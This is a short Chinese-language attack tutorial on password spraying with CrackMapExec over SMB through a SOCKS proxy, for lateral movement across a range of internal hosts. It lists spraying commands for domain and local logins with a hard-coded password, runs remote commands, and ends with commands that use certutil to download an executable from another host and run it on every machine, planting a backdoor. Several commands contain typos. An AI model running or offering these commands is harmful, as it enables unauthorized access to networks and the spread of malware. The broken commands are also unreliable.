密码喷洒自动化上线CME（CrackMapExec）
python脚本，Fscan Ladon也有类似功能。

Linux使用proxychains配置socks代理使用。
Windows使用proxifier配置socks代理使用。

## **使用smb横向喷洒**
192.168.3.21到32的ip主机

密码喷洒域登录：
proxychains python cme smb 192.168.3.21-32 -u administrator -p 'admin!@#45'

密码喷洒本地登录：
proxychains python cme smb 192.168.3.21-32 -u administrator -p 'admin!@#45' --local-auth

密码喷射本地登录命令执行：
proxychains python cme smb 192.168.3.21-32 -u administrator -p 'admin!@#45' -x 'whoami' --local-auth

^
进行下载后门程序，并运行的命令即可。
^

也可以将
ip列表.txt
账号列表.txt
密码列表.txx
进行鱼叉攻击。

^
密码喷洒本地&域登录命令执行全自动上线：
```
proxychains python cme smb 192:168.3.21-32 -u user txt -p pass.txt -x 
'cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe  c:/4455.exe & c:/4455.exe'

proxychains python cme smb 192.168.3.21-32 -u administrator -p pass.txt -x 
'cmd.exe /c certutil-urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe & c:/4455.exe' --local-auth
```
